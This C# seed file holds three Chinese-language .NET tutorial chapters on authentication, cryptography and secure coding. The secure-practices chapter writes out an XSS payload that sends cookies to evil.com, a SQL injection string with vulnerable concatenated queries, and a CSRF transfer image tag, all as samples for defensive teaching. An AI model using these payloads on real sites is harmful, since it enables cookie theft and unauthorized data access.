using DotNetLearning.Models;

namespace DotNetLearning.Data;

public static class SeedChapters_Security
{
    public static List<Chapter> GetChapters() => new()
    {
        // ── 資安 Chapter 41 ─────────────────────────────────────
        new() { Id=41, Category="security", Order=2, Level="intermediate", Icon="🔑", Title="身份驗證機制", Slug="security-auth", IsPublished=true, Content=@"
# 身份驗證機制

## 什麼是身份驗證（Authentication）？

身份驗證就是確認「你是誰」的過程。

> 💡 **比喻：進公司大門**
> - **Authentication（驗證）** = 你刷員工證進大門（證明你是員工）
> - **Authorization（授權）** = 你能進哪些房間（你有什麼權限）
> - 先驗證身份，再決定權限

---

## Session-based vs Token-based 驗證

### Session-based（傳統方式）

```
登入流程：
瀏覽器                            伺服器
  |--- POST /login               -->|
  |    {帳號, 密碼}                  |
  |                                  | 驗證成功！
  |                                  | 建立 Session（存在伺服器記憶體）
  |<-- Set-Cookie: sessionId=abc123 -|
  |                                  |
  |--- GET /profile               -->|
  |    Cookie: sessionId=abc123      |
  |                                  | 用 sessionId 查找 Session
  |<-- {使用者資料}                --|

Session 存在伺服器端（記憶體或 Redis）
```

### Token-based（JWT 方式）

```
登入流程：
瀏覽器                            伺服器
  |--- POST /login               -->|
  |    {帳號, 密碼}                  |
  |                                  | 驗證成功！
  |                                  | 產生 JWT Token
  |<-- { token: ""eyJhbG..."" }     --|
  |                                  |
  |--- GET /profile               -->|
  |    Authorization: Bearer eyJhbG..|
  |                                  | 驗證 Token 簽章
  |<-- {使用者資料}                --|

Token 存在客戶端（不需要伺服器存 Session）
```

### 兩種方式比較

```
特性           Session-based          Token-based (JWT)
──────────────────────────────────────────────────────
狀態           有狀態（伺服器存）      無狀態（客戶端存）
擴展性         難（多伺服器要共享）     易（每台都能驗證）
儲存位置       伺服器記憶體/Redis      客戶端 Cookie/Storage
跨域           困難                    容易（API 友好）
登出           刪除 Session 即可       需要額外機制（黑名單）
適用場景       傳統網站               API、SPA、手機 App
```

---

## JWT 結構解析

### JWT 的三個部分

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abc123signature
|---- Header ----|.|---- Payload ----|.|--- Signature ---|

用「.」分隔三個部分，每個部分都是 Base64 編碼
```

### Header（標頭）

```json
{
  ""alg"": ""HS256"",
  ""typ"": ""JWT""
}
```

### Payload（酬載）

```json
{
  ""sub"": ""1234"",
  ""name"": ""小明"",
  ""role"": ""admin"",
  ""exp"": 1700000000,
  ""iat"": 1699900000
}
```

```
常見 Claims（聲明）：
├── sub  → Subject（使用者 ID）
├── name → 使用者名稱
├── role → 角色/權限
├── exp  → Expiration（過期時間，Unix 時間戳）
├── iat  → Issued At（簽發時間）
└── iss  → Issuer（簽發者）
```

### Signature（簽章）

```
簽章 = HMACSHA256(
    base64(header) + ""."" + base64(payload),
    secret_key
)

簽章的用途：
├── 確保 Token 沒有被竄改
├── 只有擁有 secret_key 的伺服器才能產生有效簽章
└── 注意：Payload 只是 Base64 編碼，不是加密！任何人都能解碼看到內容
```

### C# 產生 JWT

```csharp
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using Microsoft.IdentityModel.Tokens;

// 定義密鑰（至少 32 字元）
var key = new SymmetricSecurityKey(
    Encoding.UTF8.GetBytes(""your-super-secret-key-at-least-32-chars!"")
);
// 建立簽章憑證
var credentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

// 定義 Token 中的 Claims（使用者資訊）
var claims = new[]
{
    // 使用者 ID
    new Claim(ClaimTypes.NameIdentifier, ""1234""),
    // 使用者名稱
    new Claim(ClaimTypes.Name, ""小明""),
    // 使用者角色
    new Claim(ClaimTypes.Role, ""Admin""),
};

// 建立 JWT Token
var token = new JwtSecurityToken(
    issuer: ""my-app"",          // 簽發者
    audience: ""my-app-users"",  // 對象
    claims: claims,              // 使用者資訊
    expires: DateTime.UtcNow.AddHours(1),  // 1 小時後過期
    signingCredentials: credentials         // 簽章
);

// 序列化成字串
var tokenString = new JwtSecurityTokenHandler().WriteToken(token);
// 輸出類似：eyJhbGciOiJIUzI1NiIs...
Console.WriteLine(tokenString);
```

---

## OAuth 2.0 流程

> 💡 **比喻：LINE Login**
> 你去一個新網站，它說「用 LINE 登入」：
> 1. 網站把你「帶到 LINE 的登入頁面」
> 2. 你在 LINE 輸入帳號密碼（不是在那個網站！）
> 3. LINE 問你：「這個網站想要你的名字和大頭貼，可以嗎？」
> 4. 你按「同意」
> 5. LINE 給那個網站一個「通行證」（Access Token）
> 6. 網站用通行證去 LINE 拿你的名字和大頭貼

### OAuth 2.0 授權碼流程

```
使用者          你的網站            LINE（授權伺服器）
  |                |                      |
  |-- 點擊「LINE 登入」-->|               |
  |                |--- 302 重導向 ------->|
  |                |    到 LINE 登入頁     |
  |<------------ LINE 登入頁面 -----------|
  |-- 輸入帳密、同意 -------------------->|
  |                |                      |
  |                |<-- 302 帶 auth code --|
  |                |                      |
  |                |--- POST 用 code ----->|
  |                |    換 access token    |
  |                |<-- access token ------|
  |                |                      |
  |                |--- GET /userinfo ---->|
  |                |    帶 access token    |
  |                |<-- 使用者資料 --------|
  |<-- 登入成功 ---|                      |
```

---

## Refresh Token 機制

```
為什麼需要 Refresh Token？

Access Token 壽命短（例如 15 分鐘），過期了怎麼辦？
不能每次都要使用者重新登入吧！

解決方案：
├── Access Token  → 短期（15 分鐘），用來存取 API
└── Refresh Token → 長期（7 天），用來換新的 Access Token

流程：
1. 登入 → 拿到 Access Token + Refresh Token
2. 用 Access Token 存取 API
3. Access Token 過期了
4. 用 Refresh Token 換一組新的 Access Token + Refresh Token
5. 繼續存取 API
```

```csharp
// 模擬 Refresh Token 流程
public class TokenService
{
    // 換發新的 Token 組
    public async Task<TokenResponse> RefreshTokenAsync(string refreshToken)
    {
        // 驗證 Refresh Token 是否有效
        var storedToken = await _db.RefreshTokens
            .FirstOrDefaultAsync(t => t.Token == refreshToken);

        // 檢查 Token 是否存在且未過期
        if (storedToken == null || storedToken.ExpiresAt < DateTime.UtcNow)
        {
            // Refresh Token 無效或已過期，需要重新登入
            throw new UnauthorizedAccessException(""Refresh Token 已過期，請重新登入"");
        }

        // 產生新的 Access Token
        var newAccessToken = GenerateJwtToken(storedToken.UserId);
        // 產生新的 Refresh Token（舊的作廢）
        var newRefreshToken = GenerateRefreshToken();

        // 把舊的 Refresh Token 標記為已使用
        storedToken.IsRevoked = true;
        // 儲存新的 Refresh Token
        await _db.RefreshTokens.AddAsync(new RefreshToken
        {
            Token = newRefreshToken,
            UserId = storedToken.UserId,
            ExpiresAt = DateTime.UtcNow.AddDays(7)
        });
        await _db.SaveChangesAsync();

        // 回傳新的 Token 組
        return new TokenResponse
        {
            AccessToken = newAccessToken,
            RefreshToken = newRefreshToken
        };
    }
}
```

---

## 🤔 我這樣寫為什麼會錯？

### ❌ 錯誤 1：把 JWT 存在 localStorage

```javascript
// ❌ 錯誤：localStorage 容易被 XSS 攻擊竊取
localStorage.setItem(""token"", jwtToken);
// 如果網站有 XSS 漏洞，駭客可以用 JavaScript 讀取你的 Token

// ✅ 正確：存在 HttpOnly Cookie 中
// HttpOnly Cookie 無法被 JavaScript 讀取，更安全
// 在伺服器端設定：
// Set-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite=Strict
```

```csharp
// ✅ ASP.NET Core 設定 HttpOnly Cookie
Response.Cookies.Append(""token"", jwtToken, new CookieOptions
{
    HttpOnly = true,    // JavaScript 無法讀取
    Secure = true,      // 只在 HTTPS 傳送
    SameSite = SameSiteMode.Strict,  // 防止 CSRF
    Expires = DateTimeOffset.UtcNow.AddHours(1)  // 1 小時後過期
});
```

### ❌ 錯誤 2：沒有驗證 JWT 簽章

```csharp
// ❌ 錯誤：只解碼 Token，沒有驗證簽章
var handler = new JwtSecurityTokenHandler();
// 這只是把 Base64 解碼，任何人都可以偽造一個 Token！
var token = handler.ReadJwtToken(tokenString);
var userId = token.Claims.First(c => c.Type == ""sub"").Value;

// ✅ 正確：用 ValidateToken 驗證簽章
var validationParams = new TokenValidationParameters
{
    // 驗證簽發者
    ValidateIssuer = true,
    ValidIssuer = ""my-app"",
    // 驗證對象
    ValidateAudience = true,
    ValidAudience = ""my-app-users"",
    // 驗證簽章（最重要！）
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = new SymmetricSecurityKey(
        Encoding.UTF8.GetBytes(""your-super-secret-key-at-least-32-chars!"")
    ),
    // 驗證過期時間
    ValidateLifetime = true,
};
// ValidateToken 會驗證簽章、過期時間等
var principal = handler.ValidateToken(tokenString, validationParams, out _);
```

### ❌ 錯誤 3：JWT 放敏感資料

```
❌ 錯誤：把密碼或信用卡放在 JWT Payload 中
{
  ""sub"": ""1234"",
  ""password"": ""mypassword123"",  ← 任何人都能看到！
  ""creditCard"": ""4111-1111-1111-1111""  ← 超危險！
}

JWT 的 Payload 只是 Base64 編碼，不是加密！
任何人拿到 Token 都可以解碼看到所有內容。

✅ 正確：只放不敏感的識別資訊
{
  ""sub"": ""1234"",
  ""name"": ""小明"",
  ""role"": ""user""
}
```

---

## 💡 重點整理

| 概念 | 說明 |
|------|------|
| Authentication | 驗證身份（你是誰） |
| Authorization | 授權（你能做什麼） |
| Session-based | 伺服器端存狀態，用 Cookie 傳 Session ID |
| JWT | 無狀態的 Token，包含 Header.Payload.Signature |
| OAuth 2.0 | 第三方登入的標準協議（LINE、Google 登入） |
| Refresh Token | 用來換發新 Access Token，避免頻繁重新登入 |
| HttpOnly Cookie | 最安全的 Token 儲存方式 |
" },

        // ── 資安 Chapter 42 ─────────────────────────────────────
        new() { Id=42, Category="security", Order=3, Level="advanced", Icon="🔐", Title="加密與雜湊", Slug="security-crypto", IsPublished=true, Content=@"
# 加密與雜湊

## 雜湊（Hashing）vs 加密（Encryption）

> 💡 **比喻**
> - **雜湊 = 碎紙機**：把文件丟進去，出來的碎紙無法還原成原文件。
>   用途：確認兩份文件是否相同（碎出來的樣子一樣就是同一份）
> - **加密 = 保險箱**：把文件鎖進去，有鑰匙就能拿出來。
>   用途：保護文件不被別人看到，需要時可以解鎖取回

### 差異比較

```
特性            雜湊（Hash）           加密（Encryption）
──────────────────────────────────────────────────────
可逆性          不可逆（單向）          可逆（可解密）
用途            驗證完整性、密碼存儲    保護機密資料
輸出長度        固定長度               依輸入長度變化
鑰匙            不需要                 需要金鑰
```

---

## 雜湊演算法

### MD5 和 SHA-256

```csharp
using System.Security.Cryptography;
using System.Text;

// MD5 雜湊（128 位元，已不安全）
var md5Input = ""Hello, World!"";
// 計算 MD5 雜湊值
var md5Bytes = MD5.HashData(Encoding.UTF8.GetBytes(md5Input));
// 轉換成十六進位字串
var md5Hash = Convert.ToHexString(md5Bytes).ToLower();
// 輸出：65a8e27d8879283831b664bd8b7f0ad4
Console.WriteLine($""MD5: {md5Hash}"");

// SHA-256 雜湊（256 位元，目前安全）
var sha256Input = ""Hello, World!"";
// 計算 SHA-256 雜湊值
var sha256Bytes = SHA256.HashData(Encoding.UTF8.GetBytes(sha256Input));
// 轉換成十六進位字串
var sha256Hash = Convert.ToHexString(sha256Bytes).ToLower();
// 輸出：dffd6021bb2bd5b0af676290809ec3a53191dd81c7f70a4b28688a362182986f
Console.WriteLine($""SHA-256: {sha256Hash}"");
```

```
雜湊的特性：
├── 相同輸入 → 永遠相同輸出
├── 微小變化 → 完全不同輸出（雪崩效應）
├── 無法從輸出反推輸入
└── 不同輸入可能相同輸出（碰撞），但機率極低

MD5 vs SHA-256：
├── MD5：速度快，但已被發現碰撞攻擊，不安全
└── SHA-256：目前安全，用於數位簽章、區塊鏈等
```

---

## 密碼雜湊：bcrypt 和 Argon2

```
為什麼不能用 SHA-256 存密碼？

SHA-256 太快了！駭客可以用 GPU 每秒嘗試數十億次。

bcrypt/Argon2 的設計：
├── 故意很慢（可調整難度）
├── 內建 Salt（防止彩虹表攻擊）
└── 每次雜湊結果都不同（因為 Salt 不同）
```

### bcrypt 範例

```csharp
// 安裝套件：dotnet add package BCrypt.Net-Next
using BCrypt.Net;

// 雜湊密碼（註冊時）
var password = ""mypassword123"";
// 自動產生 Salt 並雜湊，workFactor=12 控制難度
var hashedPassword = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
// 輸出類似：$2a$12$LJ3m4ys1Y2bCxYz...（每次都不同！）
Console.WriteLine(hashedPassword);

// 驗證密碼（登入時）
var inputPassword = ""mypassword123"";
// 比對使用者輸入的密碼和資料庫中的雜湊值
var isValid = BCrypt.Net.BCrypt.Verify(inputPassword, hashedPassword);
// 輸出：True
Console.WriteLine($""密碼正確：{isValid}"");

// 錯誤密碼
var wrongPassword = ""wrongpassword"";
// 錯誤密碼會回傳 false
var isWrong = BCrypt.Net.BCrypt.Verify(wrongPassword, hashedPassword);
// 輸出：False
Console.WriteLine($""密碼正確：{isWrong}"");
```

---

## Salt（鹽）

```
什麼是 Salt？

Salt 是一串隨機字串，加在密碼前面再雜湊。

沒有 Salt 的問題：
├── 相同密碼 → 相同雜湊值
├── 駭客可以用「彩虹表」（預先計算好的雜湊對照表）快速破解
└── 一旦知道一個人的密碼，所有用同密碼的人都被破解

有 Salt：
├── ""password123"" + ""abc"" → 雜湊 A
├── ""password123"" + ""xyz"" → 雜湊 B（完全不同！）
└── 每個使用者有不同的 Salt，彩虹表無效
```

```csharp
// 手動加 Salt 的概念（bcrypt 自動處理）
var password2 = ""mypassword"";
// 產生隨機 Salt
var salt = new byte[16];
RandomNumberGenerator.Fill(salt);
// 把 Salt 加在密碼前面
var saltedPassword = Convert.ToBase64String(salt) + password2;
// 再做雜湊
var hash = SHA256.HashData(Encoding.UTF8.GetBytes(saltedPassword));

// 注意：實務上請用 bcrypt 或 Argon2，它們自動處理 Salt
```

---

## 對稱加密：AES

```
對稱加密：加密和解密用同一把鑰匙

比喻：你和朋友各有一把相同的鑰匙，都能開同一個保險箱

優點：速度快
缺點：如何安全地把鑰匙給對方？
```

```csharp
using System.Security.Cryptography;

// AES 對稱加密範例
public static class AesHelper
{
    // 加密
    public static byte[] Encrypt(string plainText, byte[] key, byte[] iv)
    {
        // 建立 AES 加密器
        using var aes = Aes.Create();
        aes.Key = key;   // 設定金鑰（256 位元）
        aes.IV = iv;     // 設定初始向量（128 位元）

        // 建立加密轉換器
        using var encryptor = aes.CreateEncryptor();
        // 把明文轉成 byte 陣列
        var plainBytes = Encoding.UTF8.GetBytes(plainText);
        // 執行加密，回傳加密後的 byte 陣列
        return encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
    }

    // 解密
    public static string Decrypt(byte[] cipherBytes, byte[] key, byte[] iv)
    {
        // 建立 AES 解密器
        using var aes = Aes.Create();
        aes.Key = key;   // 必須用相同的金鑰
        aes.IV = iv;     // 必須用相同的初始向量

        // 建立解密轉換器
        using var decryptor = aes.CreateDecryptor();
        // 執行解密
        var plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
        // 把 byte 陣列轉回字串
        return Encoding.UTF8.GetString(plainBytes);
    }
}

// 使用範例
var key = new byte[32]; // 256 位元金鑰
var iv = new byte[16];  // 128 位元初始向量
// 產生隨機金鑰和 IV
RandomNumberGenerator.Fill(key);
RandomNumberGenerator.Fill(iv);

// 加密
var encrypted = AesHelper.Encrypt(""機密資料"", key, iv);
// 解密（用相同的 key 和 iv）
var decrypted = AesHelper.Decrypt(encrypted, key, iv);
// 輸出：機密資料
Console.WriteLine(decrypted);
```

---

## 非對稱加密：RSA

```
非對稱加密：有兩把鑰匙——公鑰和私鑰

比喻：
├── 公鑰 = 郵筒的投信口（任何人都能投信進去）
└── 私鑰 = 郵筒的鑰匙（只有你能打開取信）

用公鑰加密 → 只有私鑰能解密
用私鑰簽章 → 公鑰可以驗證簽章
```

```csharp
using System.Security.Cryptography;

// RSA 非對稱加密範例
using var rsa = RSA.Create(2048);  // 產生 2048 位元的金鑰對

// 匯出公鑰和私鑰
var publicKey = rsa.ExportRSAPublicKey();   // 可以公開給任何人
var privateKey = rsa.ExportRSAPrivateKey(); // 必須保密！

// 用公鑰加密（任何人都能加密）
var plainText = ""機密訊息"";
var plainBytes = Encoding.UTF8.GetBytes(plainText);
// 使用 OAEP 填充模式（比 PKCS1 更安全）
var encrypted2 = rsa.Encrypt(plainBytes, RSAEncryptionPadding.OaepSHA256);

// 用私鑰解密（只有持有私鑰的人能解密）
var decrypted2 = rsa.Decrypt(encrypted2, RSAEncryptionPadding.OaepSHA256);
// 把 byte 陣列轉回字串
Console.WriteLine(Encoding.UTF8.GetString(decrypted2));
```

---

## HTTPS 與 TLS 憑證

```
HTTPS 結合了對稱和非對稱加密：

1. 非對稱加密（RSA）→ 安全地交換對稱金鑰
2. 對稱加密（AES）  → 之後的通訊都用快速的對稱加密

為什麼不全程用 RSA？
因為 RSA 太慢了！只用來交換 AES 的金鑰。

TLS 憑證的作用：
├── 證明伺服器的身份（CA 機構簽發）
├── 包含伺服器的公鑰
└── 瀏覽器用公鑰加密「對稱金鑰」傳給伺服器
```

---

## 🤔 我這樣寫為什麼會錯？

### ❌ 錯誤 1：用 MD5 或 SHA-256 存密碼

```csharp
// ❌ 錯誤：用 SHA-256 雜湊密碼
var password3 = ""user_password"";
// SHA-256 太快了，駭客可以暴力破解
var hash3 = SHA256.HashData(Encoding.UTF8.GetBytes(password3));
// 存入資料庫...（危險！）

// ✅ 正確：用 bcrypt（故意很慢，防暴力破解）
var safeHash = BCrypt.Net.BCrypt.HashPassword(password3, workFactor: 12);
// bcrypt 自帶 Salt，每次結果不同
// 存入資料庫...（安全！）
```

### ❌ 錯誤 2：把金鑰寫死在程式碼中

```csharp
// ❌ 錯誤：金鑰寫死在原始碼中
var secretKey = ""my-super-secret-key-12345"";  // 推上 Git 就洩漏了！

// ✅ 正確：從環境變數或 Secret Manager 讀取
// 開發環境用 User Secrets
// dotnet user-secrets set ""Jwt:Key"" ""your-secret-key""
var secretKey2 = builder.Configuration[""Jwt:Key""];

// 正式環境用環境變數或 Azure Key Vault
// 環境變數：export Jwt__Key=""your-secret-key""
var secretKey3 = Environment.GetEnvironmentVariable(""JWT_KEY"");
```

### ❌ 錯誤 3：自己發明加密演算法

```
❌ 錯誤：「我把每個字元的 ASCII 碼加 3，這樣就加密了！」
這不是加密，這是凱薩密碼，2000 年前就被破解了。

✅ 正確：使用經過驗證的加密演算法
├── 對稱加密 → AES-256
├── 非對稱加密 → RSA-2048 或 ECDSA
├── 密碼雜湊 → bcrypt 或 Argon2
└── 雜湊 → SHA-256 或 SHA-3

永遠不要自己發明加密演算法！
```

---

## 💡 重點整理

| 概念 | 說明 |
|------|------|
| Hash（雜湊） | 單向不可逆，用於驗證和密碼存儲 |
| Encryption（加密） | 可逆，用於保護機密資料 |
| bcrypt/Argon2 | 專門設計來存密碼的雜湊演算法（故意很慢） |
| Salt | 隨機字串加在密碼前面，防止彩虹表攻擊 |
| AES | 對稱加密（同一把鑰匙加解密） |
| RSA | 非對稱加密（公鑰加密、私鑰解密） |
| TLS | HTTPS 底層，結合對稱和非對稱加密 |
" },

        // ── 資安 Chapter 43 ─────────────────────────────────────
        new() { Id=43, Category="security", Order=4, Level="advanced", Icon="🛡️", Title="安全開發實踐", Slug="security-practices", IsPublished=true, Content=@"
# 安全開發實踐

## 為什麼開發者要懂資安？

> 💡 **比喻：蓋房子**
> 你蓋了一棟漂亮的房子，但忘了裝門鎖。
> 小偷不需要翻牆，直接開門就進去了。
> 安全開發就是在蓋房子的時候就把鎖裝好，
> 而不是被偷了之後才加裝。

```
常見攻擊排行（OWASP Top 10 精選）：
├── SQL Injection     → 最經典的攻擊方式
├── XSS（跨站腳本）   → 在別人的網站執行你的程式碼
├── CSRF（跨站請求偽造）→ 偷偷代替你執行操作
├── 認證問題           → 密碼太簡單、Session 管理不當
└── 敏感資料外洩       → 密碼明文存儲、API Key 寫死
```

---

## 1. 輸入驗證與清理

```
黃金法則：永遠不要信任使用者的輸入！

所有來自外部的資料都可能是惡意的：
├── 表單欄位
├── URL 參數
├── HTTP Headers
├── Cookie
├── 檔案上傳
└── API 請求主體
```

```csharp
// ASP.NET Core Model Validation（模型驗證）
using System.ComponentModel.DataAnnotations;

// 用 Data Annotations 定義驗證規則
public class RegisterRequest
{
    [Required(ErrorMessage = ""使用者名稱是必填的"")]
    [StringLength(50, MinimumLength = 3, ErrorMessage = ""名稱長度必須在 3-50 字元之間"")]
    [RegularExpression(@""^[a-zA-Z0-9_]+$"", ErrorMessage = ""只能包含英文、數字和底線"")]
    public string Username { get; set; } = """";

    [Required(ErrorMessage = ""Email 是必填的"")]
    [EmailAddress(ErrorMessage = ""Email 格式不正確"")]
    public string Email { get; set; } = """";

    [Required(ErrorMessage = ""密碼是必填的"")]
    [MinLength(8, ErrorMessage = ""密碼至少 8 個字元"")]
    public string Password { get; set; } = """";
}

// Controller 中檢查 ModelState
[HttpPost(""register"")]
public IActionResult Register([FromBody] RegisterRequest request)
{
    // ModelState.IsValid 會自動根據 Data Annotations 驗證
    if (!ModelState.IsValid)
    {
        // 回傳 400 Bad Request 和錯誤訊息
        return BadRequest(ModelState);
    }
    // 驗證通過，繼續處理...
    return Ok(""註冊成功"");
}
```

---

## 2. 防止 SQL Injection

```
SQL Injection 原理：

正常查詢：
SELECT * FROM Users WHERE Name = '小明'

駭客輸入：' OR '1'='1' --
變成：
SELECT * FROM Users WHERE Name = '' OR '1'='1' --'
→ 1=1 永遠為真，回傳所有使用者！
```

```csharp
// ❌ 危險：字串拼接 SQL（SQL Injection 的溫床）
var username = ""' OR '1'='1' --"";  // 駭客的輸入
// 直接把使用者輸入拼進 SQL，超級危險！
var sql = $""SELECT * FROM Users WHERE Name = '{username}'"";
// 結果：SELECT * FROM Users WHERE Name = '' OR '1'='1' --'
// 回傳所有使用者的資料！

// ✅ 安全：使用參數化查詢
using var connection = new SqlConnection(connectionString);
// 用 @username 作為參數佔位符
var safeSql = ""SELECT * FROM Users WHERE Name = @username"";
// 建立命令物件
using var command = new SqlCommand(safeSql, connection);
// 把使用者輸入當作參數傳入（會自動轉義特殊字元）
command.Parameters.AddWithValue(""@username"", username);

// ✅ 更好：使用 Entity Framework Core（天生防 SQL Injection）
var user = await _db.Users
    // EF Core 自動使用參數化查詢
    .Where(u => u.Name == username)
    .FirstOrDefaultAsync();

// ⚠️ 注意：EF Core 的 FromSqlRaw 仍然有風險
// ❌ 危險
var users = _db.Users.FromSqlRaw($""SELECT * FROM Users WHERE Name = '{username}'"");
// ✅ 安全：用 FromSqlInterpolated
var safeUsers = _db.Users.FromSqlInterpolated(
    $""SELECT * FROM Users WHERE Name = {username}""
);
```

---

## 3. 防止 XSS（跨站腳本攻擊）

```
XSS 原理：

駭客在留言板輸入：
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

如果網站沒有過濾，其他使用者看到這則留言時，
瀏覽器會執行這段 JavaScript，把 Cookie 送到駭客的伺服器！
```

```csharp
// ASP.NET Core Razor 自動編碼（預設就有 XSS 防護）
// ✅ 安全：Razor 的 @ 會自動 HTML 編碼
// @Model.Username 會把 <script> 變成 &lt;script&gt;

// ❌ 危險：使用 Html.Raw() 會繞過編碼
// @Html.Raw(Model.Username)  ← 千萬不要對使用者輸入用 Html.Raw！

// ✅ 手動編碼（如果需要在 API 中回傳）
using System.Web;

var userInput = ""<script>alert('XSS')</script>"";
// 把 HTML 特殊字元轉義
var safeOutput = HttpUtility.HtmlEncode(userInput);
// 輸出：&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
Console.WriteLine(safeOutput);
```

### Content Security Policy（CSP）

```csharp
// 在 ASP.NET Core 設定 CSP Header
// Program.cs 中加入中介軟體
app.Use(async (context, next) =>
{
    // 設定 CSP 標頭，限制可以執行的腳本來源
    context.Response.Headers.Append(
        ""Content-Security-Policy"",
        // 只允許同源的腳本和指定的 CDN
        ""default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'""
    );
    // 繼續處理請求
    await next();
});
```

---

## 4. 防止 CSRF（跨站請求偽造）

```
CSRF 原理：

你正在登入銀行網站（有 Cookie），
然後你開了另一個惡意網站，裡面有：
<img src=""https://bank.com/transfer?to=hacker&amount=10000"">

瀏覽器會自動帶上銀行的 Cookie 去請求，
銀行以為是你本人操作，就轉帳了！
```

```csharp
// ASP.NET Core 內建 CSRF 防護

// 1. 在 Program.cs 啟用 Anti-Forgery
builder.Services.AddAntiforgery(options =>
{
    // 設定 CSRF Token 的 Header 名稱
    options.HeaderName = ""X-CSRF-TOKEN"";
});

// 2. Controller 加上 [ValidateAntiForgeryToken]
[HttpPost]
[ValidateAntiForgeryToken]  // 自動驗證 CSRF Token
public IActionResult Transfer(TransferRequest request)
{
    // 只有帶有正確 CSRF Token 的請求才會進來
    return Ok(""轉帳成功"");
}

// 3. Razor 表單自動帶 Token
// <form method=""post"">
//     @Html.AntiForgeryToken()  ← 自動產生隱藏欄位
//     <button type=""submit"">送出</button>
// </form>
```

---

## 5. 安全 Headers

```csharp
// 在 ASP.NET Core 設定安全 Headers
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;

    // 防止被嵌入 iframe（防 Clickjacking）
    headers.Append(""X-Frame-Options"", ""DENY"");

    // 啟用 XSS 過濾器
    headers.Append(""X-Content-Type-Options"", ""nosniff"");

    // 強制使用 HTTPS（HSTS）
    headers.Append(""Strict-Transport-Security"", ""max-age=31536000; includeSubDomains"");

    // 控制 Referrer 資訊洩漏
    headers.Append(""Referrer-Policy"", ""strict-origin-when-cross-origin"");

    // 權限控制（禁用不需要的瀏覽器功能）
    headers.Append(""Permissions-Policy"", ""camera=(), microphone=(), geolocation=()"");

    // 繼續處理請求
    await next();
});
```

```
常見安全 Headers 說明：

Header                      用途
──────────────────────────────────────────────────
X-Frame-Options             防止網頁被嵌入 iframe
X-Content-Type-Options      防止瀏覽器猜測內容類型
Strict-Transport-Security   強制使用 HTTPS
Content-Security-Policy     限制資源載入來源
Referrer-Policy             控制 Referrer 標頭
Permissions-Policy          控制瀏覽器 API 權限
```

---

## 6. Secrets 管理

```
機密資料不該出現在原始碼中！

常見的機密資料：
├── 資料庫連線字串
├── API Key
├── JWT Secret
├── 第三方服務的帳密
└── 加密金鑰
```

```csharp
// 開發環境：User Secrets
// 初始化 User Secrets（在專案目錄執行）
// dotnet user-secrets init
// 設定密碼
// dotnet user-secrets set ""ConnectionStrings:Default"" ""Server=...""
// 設定 JWT 金鑰
// dotnet user-secrets set ""Jwt:Key"" ""your-secret-key""

// 在 Program.cs 中讀取（開發環境自動載入 User Secrets）
var connectionString = builder.Configuration.GetConnectionString(""Default"");
// JWT 金鑰從設定讀取
var jwtKey = builder.Configuration[""Jwt:Key""];

// 正式環境：環境變數
// Linux/macOS: export ConnectionStrings__Default=""Server=...""
// Windows: set ConnectionStrings__Default=Server=...
// Docker: docker run -e ConnectionStrings__Default=""Server=..."" myapp

// Azure Key Vault（雲端環境的最佳選擇）
// 把機密儲存在 Azure Key Vault，應用程式用 Managed Identity 讀取
// builder.Configuration.AddAzureKeyVault(
//     new Uri(""https://my-vault.vault.azure.net/""),
//     new DefaultAzureCredential()
// );
```

---

## 🤔 我這樣寫為什麼會錯？

### ❌ 錯誤 1：只做前端驗證

```javascript
// ❌ 前端驗證可以被繞過！
// 駭客可以用 Postman 或 curl 直接發請求，完全繞過前端驗證
if (password.length < 8) {
    alert(""密碼太短"");
}
```

```csharp
// ✅ 正確：前後端都要驗證
// 前端驗證 → 改善使用者體驗（即時回饋）
// 後端驗證 → 真正的安全防線（不可繞過）

[HttpPost]
public IActionResult Register([FromBody] RegisterRequest request)
{
    // 後端一定要驗證！前端驗證只是 UX，不是安全措施
    if (!ModelState.IsValid)
    {
        return BadRequest(ModelState);
    }
    // 繼續處理...
    return Ok();
}
```

### ❌ 錯誤 2：在錯誤訊息中洩漏太多資訊

```csharp
// ❌ 錯誤：告訴駭客哪裡錯了
if (user == null)
    return BadRequest(""此帳號不存在"");  // 駭客知道帳號不存在
if (!VerifyPassword(password, user.PasswordHash))
    return BadRequest(""密碼錯誤"");      // 駭客知道帳號存在，只是密碼錯

// ✅ 正確：統一錯誤訊息，不洩漏細節
// 不管是帳號不存在還是密碼錯，都回傳同一個訊息
return BadRequest(""帳號或密碼錯誤"");
```

### ❌ 錯誤 3：把機密推上 Git

```
❌ 這些檔案不該被推上 Git：
├── appsettings.Development.json（含本機密碼）
├── .env（環境變數檔）
├── credentials.json
└── *.pfx / *.pem（憑證檔）

✅ 正確做法：
1. 在 .gitignore 加入這些檔案
2. 使用 User Secrets（開發）
3. 使用環境變數（正式）
4. 如果不小心推上去了，要立即更換密碼！
   （就算刪除 commit，Git 歷史紀錄還是有）
```

---

## 💡 重點整理

| 概念 | 說明 |
|------|------|
| 輸入驗證 | 永遠不信任使用者輸入，前後端都要驗證 |
| SQL Injection | 用參數化查詢或 EF Core 防禦 |
| XSS | 使用 HTML 編碼和 CSP Header |
| CSRF | 使用 Anti-Forgery Token |
| 安全 Headers | X-Frame-Options、HSTS 等 |
| Secrets 管理 | User Secrets（開發）、環境變數（正式）、Key Vault（雲端） |
" },
    };
}
